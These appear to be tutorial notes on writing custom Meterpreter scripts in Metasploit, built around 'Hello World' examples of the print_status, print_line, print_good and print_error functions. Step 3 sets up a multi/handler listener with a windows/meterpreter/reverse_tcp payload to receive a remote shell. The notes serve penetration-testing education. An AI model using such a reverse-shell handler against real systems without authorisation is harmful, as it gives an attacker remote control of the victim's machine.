# 1 - Introduction

```
sudo mousepad
```

```
File -> New 
```

```
print_status("Hello World")
```

```
File -> Save
```

```
/usr/share/metasploit-framework/scripts/meterpreter/prabhu.rb
```

To run your custom Meterpreter script (`prabhu.rb`) in Metasploit, follow these steps:

### **1. Move the Script to the Correct Location**  
Ensure your script is placed in the correct directory:  
```bash
sudo mv prabhu.rb /usr/share/metasploit-framework/scripts/meterpreter/
```

### **2. Start Metasploit Framework**  
Launch Metasploit using:  
```bash
sudo msfconsole
```

### **3. Start a Meterpreter Session**  
If you haven’t already, you need an active Meterpreter session. If you're testing locally, use:  
```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST your_ip
set LPORT your_port
exploit
```
Once the target connects, you’ll have a Meterpreter session.

### **4. Run Your Script in Meterpreter**  
Inside the Meterpreter session, run:  
```bash
run prabhu.rb
```
or specify the full path:  
```bash
run /usr/share/metasploit-framework/scripts/meterpreter/prabhu.rb
```

### **5. Debugging (if needed)**  
If your script doesn’t execute properly, check for errors:  
```bash
cat /usr/share/metasploit-framework/scripts/meterpreter/prabhu.rb
```
Ensure it starts with:  
```ruby
print_status("Hello World")
```
If errors persist, run Metasploit in debug mode:  
```bash
msfconsole -d
```



Run Scripts

```
meterpreter > run prabhu.rb
```

```
[*] Hello World
```

# 2 - print_line

```
print_line("Hello World")
```

```
meterpreter > run prabhu.rb
```

```
Hello World
```

# 3 - print_status

```
print_status("Hello World")
```

```
meterpreter > run prabhu.rb
```

```
[*] Hello World
```

# 4 - print_good

```
print_good("Hello World")
```

```
meterpreter > run prabhu.rb
```

```
[+] Hello World
```

# 5 - print_error

```
print_error("Hello World")
```

```
meterpreter > run prabhu.rb
```

```
[-] Hello World
```
